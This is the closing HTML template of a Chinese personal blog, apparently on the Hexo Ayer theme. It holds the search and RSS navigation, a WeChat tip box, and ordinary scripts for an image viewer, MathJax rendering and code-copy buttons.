  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">

        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                <!--  Controls are self-explanatory. Order can be changed. -->

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div>

<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>

<script>
    function viewer_init() {
        let pswpElement = document.querySelectorAll('.pswp')[0];
        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))

        $imgArr.forEach(($em, i) => {
            $em.onclick = () => {
                // slider展开状态
                // todo: 这样不好，后面改成状态
                if (document.querySelector('.left-col.show')) return
                let items = []
                $imgArr.forEach(($em2, i2) => {
                    let img = $em2.getAttribute('data-idx', i2)
                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
                    let title = $em2.getAttribute('alt')
                    // 获得原图尺寸
                    const image = new Image()
                    image.src = src
                    items.push({
                        src: src,
                        w: image.width || $em2.width,
                        h: image.height || $em2.height,
                        title: title
                    })
                })
                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
                    index: parseInt(i)
                });
                gallery.init()
            }
        })
    }
    viewer_init()
</script> 
<!-- MathJax -->
 <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
      tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
      }
  });

  MathJax.Hub.Queue(function() {
      var all = MathJax.Hub.getAllJax(), i;
      for(i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
      }
  });
</script>

<script src="https://cdn.staticfile.org/mathjax/2.7.7/MathJax.js"></script>
<script src="https://cdn.staticfile.org/mathjax/2.7.7/config/TeX-AMS-MML_HTMLorMML-full.js"></script>
<script>
  var ayerConfig = {
    mathjax: true,
  };
</script>

<!-- Katex -->

<!-- busuanzi  -->
 
<script src="/js/busuanzi-2.3.pure.min.js"></script>
 
<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->
 
<script src="/js/clickBoom2.js"></script>
 
<!-- CodeCopy -->
 
<link rel="stylesheet" href="/css/clipboard.css">
 <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>
 
<!-- CanvasBackground -->

<script>
  if (window.mermaid) {
    mermaid.initialize({ theme: "forest" });
  }
</script>


    
    

  </div>
</body>

</html>